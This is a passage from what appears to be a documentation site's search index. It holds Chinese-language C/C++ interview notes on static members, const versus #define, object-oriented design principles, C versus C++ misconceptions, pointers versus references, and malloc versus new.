C++\u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf \u662f\u5c5e\u4e8e\u7c7b\uff0c\u800c\u4e0d\u5c5e\u4e8e\u67d0\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\uff0c\u56e0\u6b64\u4e5f\u53ea\u6709\u4e00\u4e2a\u5730\u5740\u4fdd\u5b58\u4e00\u4efd\u6570\u636e\u5b58\u653e\u4e8e\u6570\u636e\u533a\u3002\u5728\u7c7b\u4e2d\u53ea\u662f\u58f0\u660e\uff0c\u5e76\u4e0d\u662f\u5b9a\u4e49\uff0c\u56e0\u6b64\u4e0d\u5206\u914d\u5185\u5b58\uff0c\u5bf9\u7c7b\u7528sizeof\u6c42\u5927\u5c0f\u4e5f\u4e0d\u4f1a\u5c06static\u53d8\u91cf\u5f97\u5927\u5c0f\u52a0\u5165\u3002 \u5fc5\u987b\u5728\u7c7b\u58f0\u660e\u7684\u5916\u90e8\uff0c\u4ee5\u53camain()\u51fd\u6570\u7684\u5916\u90e8\uff0c\u4e5f\u5c31\u662f\u5168\u90e8\u53d8\u91cf\u533a\u57df\u5bf9\u7c7b\u7684static\u6210\u5458\u53d8\u91cf\u518d\u6b21\u5b9a\u4e49\uff08\u5b9a\u4ee5\u540e\u624d\u5206\u914d\u552f\u4e00\u5185\u5b58\uff0c\u6b64\u65f6\u8be5\u7c7b\u9759\u6001\u6210\u5458\u53d8\u91cf\u76f8\u5f53\u4e8e\u662f\u5168\u5c40\u7684\u9759\u6001\u53d8\u91cf\u4e86\uff0c\u53ea\u662f\u8c03\u7528\u7684\u65f6\u5019\u8981\u4f7f\u7528\u7c7b\u540d\u52a0::\uff09\u3002\u82e5\u53ea\u5b9a\u4e49\u4e0d\u8d4b\u503c\u521d\u59cb\u5316\uff0c\u5219\u9ed8\u8ba4\u521d\u59cb\u5316\u4e3a0\u3002 C++\u7c7b\u7684\u9759\u6001\u6210\u5458\u51fd\u6570 \u53ea\u80fd\u8c03\u7528\u672c\u7c7b\u7684\u9759\u6001\u6210\u5458\u53d8\u91cf\u6216\u51fd\u6570\uff0c\u4e0d\u80fd\u8c03\u7528\u672c\u7c7b\u7684\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u53d8\u91cf\u3002\u56e0\u4e3a\u975e\u9759\u6001\u6210\u5458\u51fd\u6570\u548c\u53d8\u91cf\u5728\u7c7b\u6210\u5458\u51fd\u6570\u4e2d\u8c03\u7528\u65f6\uff0c\u90fd\u662f\u7531\u5f62\u53c2\u4e2d\u9690\u542b\u4e00\u4e2a\u6307\u5411\u5f53\u524d\u5b9e\u4f8b\u5bf9\u8c61\u7684this\u6307\u9488\u6765\u8c03\u7528\u3002\u7136\u800c\u9759\u6001\u6210\u5458\u51fd\u6570\u6ca1\u6709\u8fd9\u4e2athis\u5f62\u53c2\u3002 const \u5173\u952e\u5b57\u7684\u4f7f\u7528 \uf0c1 \u9632\u6b62\u88ab\u4fee\u9970\u7684\u6210\u5458\u7684\u5185\u5bb9\u88ab\u6539\u53d8\u3002 \u4fee\u9970\u7c7b\u7684\u6210\u5458\u51fd\u6570\u65f6\uff0c\u8868\u793a\u5176\u4e3a\u4e00\u4e2a\u5e38\u51fd\u6570\uff0c\u610f\u5473\u7740\u6210\u5458\u51fd\u6570\u5c06\u4e0d\u80fd\u4fee\u6539\u7c7b\u6210\u5458\u53d8\u91cf\u7684\u503c\u3002 \u5728\u51fd\u6570\u58f0\u660e\u65f6\u4fee\u9970\u53c2\u6570\uff0c\u8868\u793a\u5728\u51fd\u6570\u8bbf\u95ee\u65f6\u53c2\u6570\uff08\u5305\u62ec\u6307\u9488\u548c\u5b9e\u53c2\uff09\u7684\u503c\u4e0d\u4f1a\u53d1\u751f\u53d8\u5316\u3002 \u5bf9\u4e8e\u6307\u9488\u800c\u8a00\uff0c\u53ef\u4ee5\u6307\u5b9a\u6307\u9488\u672c\u8eab\u4e3aconst\uff0c\u4e5f\u53ef\u4ee5\u6307\u5b9a\u6307\u9488\u6240\u6307\u7684\u6570\u636e\u4e3aconst\uff0cconst int b = &a;\u6216\u8005int const b = &a;\u4fee\u9970\u7684\u90fd\u662f\u540e\u9762\u7684\u503c\uff0c\u5206\u522b\u4ee3\u8868*b\u548cb\u4e0d\u80fd\u6539\u53d8 \u3002 const \u53ef\u4ee5\u66ff\u4ee3c\u8bed\u8a00\u4e2d\u7684#define \u5b8f\u5b9a\u4e49\uff0c\u597d\u5904\u662f\u5728log\u4e2d\u53ef\u4ee5\u6253\u5370\u51faBUFFER_SIZE \u7684\u503c\uff0c\u800c\u5b8f\u5b9a\u4e49\u7684\u5219\u662f\u4e0d\u80fd #define BUFFER_SIZE 512 const int BUFFER_SIZE = 512; \u6ce8\u610f\uff1aconst\u6570\u636e\u6210\u5458\u5fc5\u987b\u4f7f\u7528\u6210\u5458\u521d\u59cb\u5316\u5217\u8868\u8fdb\u884c\u521d\u59cb\u5316\u3002 define \u548c const \u7684\u533a\u522b \uf0c1 \u5c31\u8d77\u4f5c\u7528\u7684\u9636\u6bb5\u800c\u8a00\uff1a #define\u662f\u5728\u7f16\u8bd1\u7684\u9884\u5904\u7406\u9636\u6bb5\u8d77\u4f5c\u7528\uff0c\u800cconst\u662f\u5728 \u7f16\u8bd1\u3001\u8fd0\u884c\u7684\u65f6\u5019\u8d77\u4f5c\u7528\u3002 \u5c31\u8d77\u4f5c\u7528\u7684\u65b9\u5f0f\u800c\u8a00\uff1a #define\u53ea\u662f\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u66ff\u6362\uff0c\u6ca1\u6709\u7c7b\u578b\u68c0\u67e5\u3002\u800cconst\u6709\u5bf9\u5e94\u7684\u6570\u636e\u7c7b\u578b\uff0c\u662f\u8981\u8fdb\u884c\u5224\u65ad\u7684\uff0c\u53ef\u4ee5\u907f\u514d\u4e00\u4e9b\u4f4e\u7ea7\u7684\u9519\u8bef\u3002 \u5c31\u5b58\u50a8\u65b9\u5f0f\u800c\u8a00\uff1a#define\u53ea\u662f\u8fdb\u884c\u5c55\u5f00\uff0c\u6709\u591a\u5c11\u5730\u65b9\u4f7f\u7528\uff0c\u5c31\u66ff\u6362\u591a\u5c11\u6b21\uff0c\u5b83\u5b9a\u4e49\u7684\u5b8f\u5e38\u91cf\u5728\u5185\u5b58\u4e2d\u6709\u82e5\u5e72\u4e2a\u5907\u4efd\uff1bconst\u5b9a\u4e49\u7684\u53ea\u8bfb\u53d8\u91cf\u5728\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u53ea\u6709\u4e00\u4efd\u5907\u4efd\u3002 \u4ece\u4ee3\u7801\u8c03\u8bd5\u7684\u65b9\u4fbf\u7a0b\u5ea6\u800c\u8a00\uff1a const\u5e38\u91cf\u53ef\u4ee5\u8fdb\u884c\u8c03\u8bd5\u7684\uff0cdefine\u662f\u4e0d\u80fd\u8fdb\u884c\u8c03\u8bd5\u7684\uff0c\u56e0\u4e3a\u5728\u9884\u7f16\u8bd1\u9636\u6bb5\u5c31\u5df2\u7ecf\u66ff\u6362\u6389\u4e86\u3002 \u9762\u5411\u5bf9\u8c61\u7684\u8bbe\u8ba1\u539f\u5219 \uf0c1 \u5355\u4e00\u804c\u8d23\u539f\u5219,\u4e00\u4e2a\u5408\u7406\u7684\u7c7b\uff0c\u5e94\u8be5\u4ec5\u6709\u4e00\u4e2a\u5f15\u8d77\u5b83\u53d8\u5316\u7684\u539f\u56e0\uff0c\u5373\u5355\u4e00\u804c\u8d23,\u5c31\u662f\u8bbe\u8ba1\u7684\u8fd9\u4e2a\u7c7b\u529f\u80fd\u5e94\u8be5\u53ea\u6709\u4e00\u4e2a; \u4f18\u70b9\uff1a\u6d88\u9664\u8026\u5408\uff0c\u51cf\u5c0f\u56e0\u9700\u6c42\u53d8\u5316\u5f15\u8d77\u4ee3\u7801\u50f5\u5316\u3002 \u5f00-\u95ed\u539f\u5219\uff0c\u8bb2\u7684\u662f\u8bbe\u8ba1\u8981\u5bf9\u6269\u5c55\u6709\u597d\u7684\u652f\u6301\uff0c\u800c\u5bf9\u4fee\u6539\u8981\u4e25\u683c\u9650\u5236\u3002\u5373\u5bf9\u6269\u5c55\u5f00\u653e\uff0c\u5bf9\u4fee\u6539\u5c01\u95ed\u3002 \u4f18\u70b9\uff1a\u964d\u4f4e\u4e86\u7a0b\u5e8f\u5404\u90e8\u5206\u4e4b\u95f4\u7684\u8026\u5408\u6027\uff0c\u5176\u9002\u5e94\u6027\u3001\u7075\u6d3b\u6027\u3001\u7a33\u5b9a\u6027\u90fd\u6bd4\u8f83\u597d\u3002\u5f53\u5df2\u6709\u8f6f\u4ef6\u7cfb\u7edf\u9700\u8981\u589e\u52a0\u65b0\u7684\u529f\u80fd\u65f6\uff0c\u4e0d\u9700\u8981\u5bf9\u4f5c\u4e3a\u7cfb\u7edf\u57fa\u7840\u7684\u62bd\u8c61\u5c42\u8fdb\u884c\u4fee\u6539\uff0c\u53ea\u9700\u8981\u5728\u539f\u6709\u57fa\u7840\u4e0a\u9644\u52a0\u65b0\u7684\u6a21\u5757\u5c31\u80fd\u5b9e\u73b0\u6240\u9700\u8981\u6dfb\u52a0\u7684\u529f\u80fd\u3002\u589e\u52a0\u7684\u65b0\u6a21\u5757\u5bf9\u539f\u6709\u7684\u6a21\u5757\u5b8c\u5168\u6ca1\u6709\u5f71\u54cd\u6216\u5f71\u54cd\u5f88\u5c0f\uff0c\u8fd9\u6837\u5c31\u65e0\u987b\u4e3a\u539f\u6709\u6a21\u5757\u8fdb\u884c\u91cd\u65b0\u6d4b\u8bd5\u3002 \u91cc\u6c0f\u4ee3\u6362\u539f\u5219\uff0c\u5f88\u4e25\u683c\u7684\u539f\u5219\uff0c\u89c4\u5219\u662f\u201c\u5b50\u7c7b\u5fc5\u987b\u80fd\u591f\u66ff\u6362\u57fa\u7c7b\uff0c\u5426\u5219\u4e0d\u5e94\u5f53\u8bbe\u8ba1\u4e3a\u5176\u5b50\u7c7b\u3002\u201d\u4e5f\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a\u8f6f\u4ef6\u5b9e\u4f53\u5982\u679c\u4f7f\u7528\u7684\u662f\u4e00\u4e2a\u7236\u7c7b\u7684\u8bdd\uff0c\u90a3\u4e48\u4e00\u5b9a\u9002\u7528\u4e8e\u5176\u5b50\u7c7b\uff0c\u800c\u4e14\u5b83\u5bdf\u89c9\u4e0d\u51fa\u7236\u7c7b\u5bf9\u8c61\u548c\u5b50\u7c7b\u5bf9\u8c61\u7684\u533a\u522b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728\u8f6f\u4ef6\u91cc\u9762\uff0c\u628a\u7236\u7c7b\u90fd\u66ff\u6362\u6210\u5b83\u7684\u5b50\u7c7b\uff0c\u7a0b\u5e8f\u7684\u884c\u4e3a\u6ca1\u6709\u53d8\u5316\u3002 \u4f18\u70b9\uff1a\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5b9e\u73b0\u540c\u4e00\u7236\u7c7b\u4e0b\u5404\u4e2a\u5b50\u7c7b\u7684\u4e92\u6362\uff0c\u800c\u5ba2\u6237\u7aef\u53ef\u4ee5\u6beb\u4e0d\u5bdf\u89c9\u3002 \u4f9d\u8d56\u5012\u6362\u539f\u5219\uff0c\u201c\u8bbe\u8ba1\u8981\u4f9d\u8d56\u4e8e\u62bd\u8c61\u800c\u4e0d\u662f\u5177\u4f53\u5316\u201d\u3002\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u8bbe\u8ba1\u7684\u65f6\u5019\u6211\u4eec\u8981\u7528\u62bd\u8c61\u6765\u601d\u8003\uff0c\u800c\u4e0d\u662f\u4e00\u4e0a\u6765\u5c31\u5f00\u59cb\u5212\u5206\u6211\u9700\u8981\u54ea\u4e9b\u54ea\u4e9b\u7c7b\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u662f\u5177\u4f53\u3002 \u201cHigh level modules should not depend upon low level modules, both should depend upon abstractions. Abstractions should not depend upon details, details should depend upon abstractions.\u201d \u9ad8\u5c42\u6a21\u5757\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4f4e\u5c42\u6a21\u5757\uff0c\u5b83\u4eec\u90fd\u5e94\u8be5\u4f9d\u8d56\u62bd\u8c61\u3002\u62bd\u8c61\u4e0d\u5e94\u8be5\u4f9d\u8d56\u4e8e\u7ec6\u8282\uff0c\u7ec6\u8282\u5e94\u8be5\u4f9d\u8d56\u4e8e\u62bd\u8c61\u3002 \u53e6\u4e00\u79cd\u8868\u8ff0\u4e3a\uff1a \u8981\u9488\u5bf9\u63a5\u53e3\u7f16\u7a0b\uff0c\u4e0d\u8981\u9488\u5bf9\u5b9e\u73b0\u7f16\u7a0b\u3002\u5373\u201cProgram to an interface, not an implementation.\u201d \u4f18\u70b9\uff1a\u4eba\u7684\u601d\u7ef4\u672c\u8eab\u5b9e\u9645\u4e0a\u5c31\u662f\u5f88\u62bd\u8c61\u7684\uff0c\u6211\u4eec\u5206\u6790\u95ee\u9898\u7684\u65f6\u5019\u4e0d\u662f\u4e00\u4e0b\u5b50\u5c31\u8003\u8651\u5230\u7ec6\u8282\uff0c\u800c\u662f\u5f88\u62bd\u8c61\u7684\u5c06\u6574\u4e2a\u95ee\u9898\u90fd\u6784\u601d\u51fa\u6765\uff0c\u6240\u4ee5\u9762\u5411\u62bd\u8c61\u8bbe\u8ba1\u662f\u7b26\u5408\u4eba\u7684\u601d\u7ef4\u7684\u3002\u53e6\u5916\u8fd9\u4e2a\u539f\u5219\u4f1a\u5f88\u597d\u7684\u652f\u6301\uff08\u5f00\u95ed\u539f\u5219\uff09OCP\uff0c\u9762\u5411\u62bd\u8c61\u7684\u8bbe\u8ba1\u4f7f\u6211\u4eec\u80fd\u591f\u4e0d\u5fc5\u592a\u591a\u4f9d\u8d56\u4e8e\u5b9e\u73b0\uff0c\u8fd9\u6837\u6269\u5c55\u5c31\u6210\u4e3a\u4e86\u53ef\u80fd\uff0c\u8fd9\u4e2a\u539f\u5219\u4e5f\u662f\u53e6\u4e00\u7bc7\u6587\u7ae0\u300aDesign by Contract\u300b\u7684\u57fa\u77f3\u3002 \u63a5\u53e3\u9694\u79bb\u539f\u5219\uff0c\u201c\u5c06\u5927\u7684\u63a5\u53e3\u6253\u6563\u6210\u591a\u4e2a\u5c0f\u63a5\u53e3\u201d\uff0c\u8ba9\u7cfb\u7edf\u89e3\u8026\uff0c\u4ece\u800c\u5bb9\u6613\u91cd\u6784\uff0c\u66f4\u6539\u548c\u91cd\u65b0\u90e8\u7f72\u3002 \u4f18\u70b9\uff1a\u4f1a\u4f7f\u4e00\u4e2a\u8f6f\u4ef6\u7cfb\u7edf\u529f\u80fd\u6269\u5c55\u65f6\uff0c\u4fee\u6539\u7684\u538b\u529b\u4e0d\u4f1a\u4f20\u5230\u522b\u7684\u5bf9\u8c61\u90a3\u91cc\u3002 \u8fea\u7c73\u7279\u6cd5\u5219\u6216\u6700\u5c11\u77e5\u8bc6\u539f\u5219\uff0c\u8fd9\u4e2a\u539f\u5219\u9996\u6b21\u5728Demeter\u7cfb\u7edf\u4e2d\u5f97\u5230\u6b63\u5f0f\u8fd0\u7528\uff0c\u6240\u4ee5\u5b9a\u4e49\u4e3a\u8fea\u7c73\u7279\u6cd5\u5219\u3002\u5b83\u8bb2\u7684\u662f\u201c\u4e00\u4e2a\u5bf9\u8c61\u5e94\u5f53\u5c3d\u53ef\u80fd\u5c11\u7684\u53bb\u4e86\u89e3\u5176\u4ed6\u5bf9\u8c61\u201d\u3002 \u4f18\u70b9\uff1a\u6d88\u9664\u8026\u5408\u3002 \u597d\u4e86\uff0c\u9762\u5411\u5bf9\u8c61\u7684\u516d\u5927\u539f\u5219\u5c31\u4ecb\u7ecd\u5230\u8fd9\u91cc\u4e86\u3002\u5176\u5b9e\uff0c\u6211\u4eec\u4e0d\u96be\u53d1\u73b0\uff0c\u516d\u5927\u539f\u5219\u867d\u8bf4\u662f\u539f\u5219\uff0c\u4f46\u5b83\u4eec\u5e76\u4e0d\u662f\u5f3a\u5236\u6027\u7684\uff0c\u66f4\u591a\u7684\u662f\u5efa\u8bae\u3002\u9075\u7167\u8fd9\u4e9b\u539f\u5219\u56fa\u7136\u80fd\u5e2e\u52a9\u6211\u4eec\u66f4\u597d\u7684\u89c4\u8303\u6211\u4eec\u7684\u7cfb\u7edf\u8bbe\u8ba1\u548c\u4ee3\u7801\u4e60\u60ef\uff0c\u4f46\u5e76\u4e0d\u662f\u6240\u6709\u7684\u573a\u666f\u90fd\u9002\u7528\uff0c\u5c31\u4f8b\u5982\u63a5\u53e3\u9694\u79bb\u539f\u5219\uff0c\u5728\u73b0\u5b9e\u7cfb\u7edf\u5f00\u53d1\u4e2d\uff0c\u6211\u4eec\u5f88\u96be\u5b8c\u5168\u9075\u5b88\u4e00\u4e2a\u6a21\u5757\u4e00\u4e2a\u63a5\u53e3\u7684\u8bbe\u8ba1\uff0c\u5426\u5219\u4e1a\u52a1\u591a\u4e86\u5c31\u4f1a\u51fa\u73b0\u4ee3\u7801\u8bbe\u8ba1\u8fc7\u5ea6\u7684\u60c5\u51b5\uff0c\u8ba9\u6574\u4e2a\u7cfb\u7edf\u53d8\u5f97\u8fc7\u4e8e\u5e9e\u5927\uff0c\u589e\u52a0\u4e86\u7cfb\u7edf\u7684\u590d\u6742\u5ea6\uff0c\u751a\u81f3\u5f71\u54cd\u81ea\u5df1\u7684\u9879\u76ee\u8fdb\u5ea6\uff0c\u5f97\u4e0d\u507f\u5931\u554a\u3002 \u6240\u4ee5\uff0c\u8fd8\u662f\u90a3\u53e5\u8bdd\uff0c\u5728\u5408\u9002\u7684\u573a\u666f\u9009\u62e9\u5408\u9002\u7684\u6280\u672f\uff01 C++ \u7f16\u8bd1\u8fc7\u7a0b \uf0c1 \u9884\u7f16\u8bd1\u5904\u7406(.c) \uff0d> \u7f16\u8bd1\u3001\u4f18\u5316\u7a0b\u5e8f\uff08.s\uff09\uff0d>\u6c47\u7f16\u7a0b\u5e8f(.obj\u3001.o\u3001.a\u3001.ko) \uff0d> \u94fe\u63a5\u7a0b\u5e8f\uff08.exe\u3001.elf\u3001.axf\u7b49\uff09","title":"Questions"},{"location":"cplusplus/questions/#common-interview-questions","text":"\u672c\u4eba\u603b\u7ed3\u7684\u5e38\u89c1\u9762\u8bd5\u9898","title":"C/C++ \u5e38\u89c1\u9762\u8bd5\u9898"},{"location":"cplusplus/questions/#difference-between-c-and-cpp","text":"\u9664\u4e86\u9762\u5411\u5bf9\u8c61\u4e0e\u9762\u5411\u8fc7\u7a0b\u8fd9\u4e2a\u56de\u7b54\u4e4b\u5916\uff0cC \u4e0e C++ \u7684\u771f\u6b63\u533a\u522b\u5728\u54ea\u91cc\uff1f \u8fd9\u51e0\u5e74\u4e0d\u7ba1\u662f\u793e\u56e2\u5b9e\u4e60\u5de5\u4f5c\u9762\u8bd5\u90fd\u6709\u88ab\u95ee\u5230\u8fd9\u4e2a\u95ee\u9898\u3002\u4f46\u662f\u300c\u9762\u5411\u5bf9\u8c61\u4ee5\u53ca\u9762\u5411\u8fc7\u7a0b\u300d\u8fd9\u4e2a\u56de\u7b54\u4f3c\u4e4e\u90fd\u4e0d\u662f\u6700\u597d\u6216\u8005\u6700\u5b8c\u5584\u7684\u7b54\u6848\u3002 \u6240\u4ee5\u8fd9\u4e2a\u95ee\u9898\u6839\u672c\u6ca1\u6709\u7b80\u5355\u7684\u7b54\u6848\uff0c\u90093\u4e2a\u89d2\u5ea6\u8c08\u5c31\u80fd\u51993\u7bc7\u8bba\u6587\u3002\u7b80\u5355\u8bf4\u8bf4\u51e0\u4e2a\u5e38\u89c1\u7684\u8bef\u533a\u3002 \u8bef\u533a1\uff1aC++\u662f\u9762\u5411\u5bf9\u8c61\u7684C\uff1f\u5e76\u4e0d\u662f\u3002\u73b0\u4ee3C++\u662f\u81f3\u5c11\u56db\u79cd\u7f16\u7a0b\u8303\u5f0f\u7684\u96c6\u5408\u4f53\uff08\u9762\u5411\u8fc7\u7a0b\uff0c\u9762\u5411\u5bf9\u8c61\uff0c\u6cdb\u578b\u7f16\u7a0b\u548c\u5143\u7f16\u7a0b\uff0c\u51fd\u6570\u5f0f\u7f16\u7a0b\u7b49\uff0c\u5b9e\u9645\u53ef\u80fd\u4e0d\u6b624\u79cd\uff09\u3002\u8bf4C++\u662f\u9762\u5411\u5bf9\u8c61\u8bed\u8a00\uff0c\u662f\u4e00\u79cd\u5f88\u77a7\u4e0d\u8d77C++\u7684\u8bf4\u6cd5\uff0c\u56e0\u4e3a\u9762\u5411\u5bf9\u8c61\u4ec5\u4ec5\u662fC++\u7684\u591a\u79cd\u8303\u5f0f\u4e4b\u4e00\u3002 \u8bef\u533a2\uff1aC\u662f\u9762\u5411\u8fc7\u7a0b\u8bed\u8a00\uff1f\u4e0d\u80fd\u8fd9\u4e48\u8bf4\u3002\u5728\u9762\u5411\u5bf9\u8c61\u65b9\u9762\uff0cC\u8bed\u8a00\u63d0\u4f9b\u7684\u8bed\u6cd5\u652f\u6301\u6bd4\u8f83\u8584\u5f31\uff0c\u4f46\u8fd9\u4e0d\u8868\u793aC\u662f\u9762\u5411\u8fc7\u7a0b\u7684\u8bed\u8a00\u3002\u7528C\u8bed\u8a00\u5199\u9762\u5411\u5bf9\u8c61\u7a0b\u5e8f\u4e0d\u4ec5\u4e0d\u5f31\uff0c\u751a\u81f3\u4f1a\u6709\u4e00\u4e9b\u4f18\u52bf\u3002\u4e16\u754c\u4e0a\u6709\u5f88\u591a\u975e\u5e38\u91cd\u8981\u7684\u3001\u5927\u91cf\u4f7f\u7528\u9762\u5411\u5bf9\u8c61\u6280\u672f\u7684\u8f6f\u4ef6\u662f\u7528\u7eafC\u5199\u7684\u3002\u4f8b\u5982Linux\u7684\u56fe\u5f62\u754c\u9762GNOME\u3002 \u8bef\u533a3\uff1aC\u662fC++\u7684\u5b50\u96c6\uff0cC\u652f\u6301\u7684\u8bed\u6cd5C++\u90fd\u652f\u6301\u3002\u4e0d\u5bf9\u3002C++\u5728\u6700\u521d\u8bbe\u8ba1\u65f6\u662f\u57fa\u4e8eC\u7684\uff0c\u7edd\u5927\u591a\u6570\u8bed\u6cd5\u90fd\u517c\u5bb9\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e9b\u7ec6\u8282\u5374\u91cd\u8981\u7684\u5730\u65b9\uff0c\u4e8c\u8005\u5dee\u522b\u975e\u5e38\u5927\u3002\u4f8b\u5982\uff0cC\u8bed\u8a00\u7684\u51fd\u6570\u6307\u9488\u975e\u5e38\u795e\u5947\uff1a int (*pfunc)(); \u770b\u4e0a\u53bbpfunc\u53ef\u4ee5\u6307\u5411\u8fd4\u56de\u503c\u4e3aint\uff0c\u65e0\u53c2\u6570\u7684\u51fd\u6570\uff1f\u5e76\u4e0d\u662f\u3002\u5b9e\u9645\u4e0apfunc\u53ef\u4ee5\u6307\u5411\u4efb\u610f\u8fd4\u56de\u503c\u4e3aint\u7684\u51fd\u6570\uff0c\u65e0\u8bba\u53c2\u6570\u662f\u4ec0\u4e48\u3002\u800c\u65e0\u53c2\u7684\u60c5\u51b5\u5fc5\u987b\u5199\u660e\u53c2\u6570\u4e3avoid\uff1a int (*pfunc)(void); C\u8bed\u8a00\u4e0d\u5fc5\u6307\u5b9a\u53c2\u6570\u7c7b\u578b\u4e5f\u53ef\u4ee5\u5f15\u7528\u51fd\u6570\uff0c\u8fd9\u4e00\u70b9\u8ba9C\u8bed\u8a00\u5177\u6709\u5f88\u5f3a\u7684\u52a8\u6001\u7279\u6027\u3002\u800cC++\u53bb\u9664\u4e86\u8fd9\u79cd\u8bbe\u8ba1\uff0c\u56e0\u4e3a\u7834\u574f\u4e86\u7c7b\u578b\u5b89\u5168\u3002\u540c\u7406\uff0cC\u8bed\u8a00\u5e38\u7528\u7684(void*)\u8f6c\u6362\u5728C++\u4e2d\u4e5f\u5728\u5f88\u5927\u7a0b\u5ea6\u4e0a\u6452\u5f03\u4e86\uff0c\u7406\u7531\u4e5f\u662f\u7c7b\u578b\u4e0d\u5b89\u5168\u3002\u54ea\u4e2a\u8bbe\u8ba1\u597d\u54ea\u4e2a\u4e0d\u597d\u4e0d\u91cd\u8981\u3002\u91cd\u8981\u7684\u662f\uff1aC\u5e76\u4e0d\u662fC++\u7684\u5b50\u96c6\uff0cC++\u4e5f\u4e0d\u662fC\u7684\u8d85\u96c6\u3002\u5b83\u4eec\u5728\u8bed\u6cd5\u3001\u8bbe\u8ba1\u7406\u5ff5\u3001\u5e38\u7528\u5199\u6cd5\u65b9\u9762\u5747\u6709\u4e0d\u540c\uff0c\u5230\u4eca\u5929\u4e8c\u8005\u7684\u5dee\u522b\u8d8a\u6765\u8d8a\u5927\u3002 \u8bef\u533a4\uff1aC++\u6bd4C\u529f\u80fd\u591a\uff0c\u6240\u4ee5C++\u8fd0\u884c\u6bd4C\u6162\u4e00\u70b9\u3002\u4e0d\u5bf9\u3002\u867d\u7136C++\u52a0\u5165\u4e86\u5f88\u591a\u5f88\u591a\u529f\u80fd\uff0c\u4f46\u7531\u4e8e\u7edd\u5927\u591a\u6570\u529f\u80fd\u90fd\u662f\u5728\u7f16\u8bd1\u5668\u4e0a\u505a\u624b\u811a\uff0c\u5927\u591a\u60c5\u51b5\u4e0b\u4ec5\u5f71\u54cd\u7f16\u8bd1\u901f\u5ea6\uff0c\u800c\u4e0d\u5f71\u54cd\u8fd0\u884c\u901f\u5ea6\u3002\u800c\u4e14\u6cdb\u578b\u3001\u5143\u7f16\u7a0b\u7b49\u6280\u672f\u7528\u597d\u4e86\uff0c\u80fd\u8ba9C++\u7684\u7a0b\u5e8f\u8fd0\u884c\u7684\u66f4\u5feb\u3002\u53cd\u800c\u662fC\uff0c\u7531\u4e8e\u5927\u91cf\u4f7f\u7528\u4e0d\u5b9a\u7c7b\u578b\u7684\u8f6c\u6362\uff0c\u635f\u5931\u7684\u6027\u80fd\u76f8\u5f53\u53ef\u89c2\u3002 \u603b\u4e4b\uff0cC\u4e0eC++\u7684\u533a\u522b\u8fdc\u4e0d\u662f\u4e00\u6bb5\u8bdd\u80fd\u591f\u8bb2\u6e05\u695a\u3002","title":"C \u548c C++ \u7684\u533a\u522b"},{"location":"cplusplus/questions/#difference-between-pointer-and-reference","text":"\u6307\u9488\u662f\u4e00\u4e2a\u53d8\u91cf\uff0c\u53ea\u4e0d\u8fc7\u8fd9\u4e2a\u53d8\u91cf\u5b58\u50a8\u7684\u662f\u4e00\u4e2a\u5730\u5740\uff0c\u6307\u5411\u5185\u5b58\u7684\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\uff1b\u800c\u5f15\u7528\u8ddf\u539f\u6765\u7684\u53d8\u91cf\u5b9e\u8d28\u4e0a\u662f\u540c\u4e00\u4e2a\u4e1c\u897f\uff0c\u53ea\u4e0d\u8fc7\u662f\u539f\u53d8\u91cf\u7684\u4e00\u4e2a\u522b\u540d\u800c\u5df2\u3002\"sizeof\u5f15\u7528\"\u5f97\u5230\u7684\u662f\u6240\u6307\u5411\u7684\u53d8\u91cf(\u5bf9\u8c61)\u7684\u5927\u5c0f\uff0c\u800c\"sizeof\u6307\u9488\"\u5f97\u5230\u7684\u662f\u6307\u9488\u672c\u8eab\u7684\u5927\u5c0f\uff1b \u5f15\u7528\u5fc5\u987b\u88ab\u521d\u59cb\u5316\uff0c\u6307\u9488\u4e0d\u5fc5\u3002 \u5f15\u7528\u521d\u59cb\u5316\u4ee5\u540e\u4e0d\u80fd\u88ab\u6539\u53d8\uff0c\u6307\u9488\u53ef\u4ee5\u6539\u53d8\u6240\u6307\u7684\u5bf9\u8c61\u3002 \u4e0d\u5b58\u5728\u6307\u5411\u7a7a\u503c\u7684\u5f15\u7528\uff0c\u4f46\u662f\u5b58\u5728\u6307\u5411\u7a7a\u503c\u7684\u6307\u9488\u3002 \u5f15\u7528\u7684\u521b\u5efa\u548c\u9500\u6bc1\u4e0d\u4f1a\u8c03\u7528\u7c7b\u7684\u62f7\u8d1d\u6784\u9020\u51fd\u6570\u548c\u6790\u6784\u51fd\u6570\u3002 \u6307\u9488\u53ef\u4ee5\u6709\u591a\u7ea7\uff0c\u4f46\u662f\u5f15\u7528\u53ea\u80fd\u662f\u4e00\u7ea7\uff08int **p\uff1b\u5408\u6cd5 \u800c int &&a\u662f\u4e0d\u5408\u6cd5\u7684\uff09\u3002","title":"\u6307\u9488\u548c\u5f15\u7528\u7684\u533a\u522b"},{"location":"cplusplus/questions/#difference-between-malloc-and-new","text":"new/delete\u662fC++\u5173\u952e\u5b57\uff0c\u9700\u8981\u7f16\u8bd1\u5668\u652f\u6301\u3002malloc/free\u662f\u5e93\u51fd\u6570\uff0c\u9700\u8981\u5934\u6587\u4ef6\u652f\u6301\u3002 \u4f7f\u7528new\u64cd\u4f5c\u7b26\u7533\u8bf7\u5185\u5b58\u5206\u914d\u65f6\u65e0\u987b\u6307\u5b9a\u5185\u5b58\u5757\u7684\u5927\u5c0f\uff0c\u7f16\u8bd1\u5668\u4f1a\u6839\u636e\u7c7b\u578b\u4fe1\u606f\u81ea\u884c\u8ba1\u7b97\u3002\u800cmalloc\u5219\u9700\u8981\u663e\u5f0f\u5730\u6307\u51fa\u6240\u9700\u5185\u5b58\u7684\u5c3a\u5bf8\u3002 